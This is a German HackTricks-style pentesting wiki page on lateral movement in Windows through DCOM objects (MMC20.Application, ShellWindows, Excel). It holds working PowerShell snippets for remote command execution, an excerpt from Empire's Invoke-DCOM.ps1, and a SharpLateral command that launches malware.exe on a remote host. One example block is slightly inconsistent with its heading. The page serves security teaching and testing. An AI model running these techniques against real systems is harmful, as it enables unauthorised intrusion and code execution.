# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**Für weitere Informationen zu dieser Technik siehe den Originalbeitrag von [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) Objekte bieten eine interessante Möglichkeit für netzwerkbasierte Interaktionen mit Objekten. Microsoft stellt umfassende Dokumentation sowohl für DCOM als auch für Component Object Model (COM) zur Verfügung, die [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) zugänglich ist. Eine Liste von DCOM-Anwendungen kann mit dem PowerShell-Befehl abgerufen werden:
```bash
Get-CimInstance Win32_DCOMApplication
```
Das COM-Objekt, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), ermöglicht das Scripting von MMC-Snap-In-Operationen. Bemerkenswert ist, dass dieses Objekt eine `ExecuteShellCommand`-Methode unter `Document.ActiveView` enthält. Weitere Informationen zu dieser Methode finden Sie [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Überprüfen Sie es in Aktion:

Diese Funktion erleichtert die Ausführung von Befehlen über ein Netzwerk durch eine DCOM-Anwendung. Um remote mit DCOM als Administrator zu interagieren, kann PowerShell wie folgt verwendet werden:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Dieser Befehl verbindet sich mit der DCOM-Anwendung und gibt eine Instanz des COM-Objekts zurück. Die ExecuteShellCommand-Methode kann dann aufgerufen werden, um einen Prozess auf dem Remote-Host auszuführen. Der Prozess umfasst die folgenden Schritte:

Überprüfen Sie die Methoden:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE erhalten:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Für weitere Informationen zu dieser Technik siehe den ursprünglichen Beitrag [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Das **MMC20.Application**-Objekt wurde als mangelhaft in Bezug auf explizite "LaunchPermissions" identifiziert, was zu Berechtigungen führt, die Administratoren den Zugriff erlauben. Für weitere Details kann ein Thread [hier](https://twitter.com/tiraniddo/status/817532039771525120) erkundet werden, und die Verwendung von [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET zum Filtern von Objekten ohne explizite Launch Permission wird empfohlen.

Zwei spezifische Objekte, `ShellBrowserWindow` und `ShellWindows`, wurden aufgrund ihres Fehlens an expliziten Launch Permissions hervorgehoben. Das Fehlen eines `LaunchPermission`-Registry-Eintrags unter `HKCR:\AppID\{guid}` bedeutet, dass keine expliziten Berechtigungen vorhanden sind.

### ShellWindows

Für `ShellWindows`, das keinen ProgID hat, ermöglichen die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance` die Objektinstanziierung unter Verwendung seiner AppID. Dieser Prozess nutzt OleView .NET, um die CLSID für `ShellWindows` abzurufen. Nach der Instanziierung ist eine Interaktion über die Methode `WindowsShell.Item` möglich, was zu Methodenaufrufen wie `Document.Application.ShellExecute` führt.

Beispiel-PowerShell-Befehle wurden bereitgestellt, um das Objekt zu instanziieren und Befehle remote auszuführen:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Laterale Bewegung mit Excel DCOM-Objekten

Laterale Bewegung kann durch das Ausnutzen von DCOM Excel-Objekten erreicht werden. Für detaillierte Informationen ist es ratsam, die Diskussion über die Nutzung von Excel DDE für laterale Bewegung über DCOM im [Blog von Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) zu lesen.

Das Empire-Projekt bietet ein PowerShell-Skript, das die Nutzung von Excel für Remote Code Execution (RCE) durch Manipulation von DCOM-Objekten demonstriert. Nachfolgend sind Ausschnitte aus dem Skript verfügbar auf [Empires GitHub-Repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), die verschiedene Methoden zur Ausnutzung von Excel für RCE zeigen:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automatisierungstools für laterale Bewegung

Zwei Tools werden hervorgehoben, um diese Techniken zu automatisieren:

- **Invoke-DCOM.ps1**: Ein PowerShell-Skript, das vom Empire-Projekt bereitgestellt wird und die Ausführung verschiedener Methoden zum Ausführen von Code auf Remote-Maschinen vereinfacht. Dieses Skript ist im Empire GitHub-Repository verfügbar.

- **SharpLateral**: Ein Tool, das zum Ausführen von Code aus der Ferne entwickelt wurde und mit dem Befehl verwendet werden kann:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatische Werkzeuge

- Das Powershell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) ermöglicht es, alle kommentierten Methoden zum Ausführen von Code auf anderen Maschinen einfach aufzurufen.
- Sie könnten auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referenzen

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
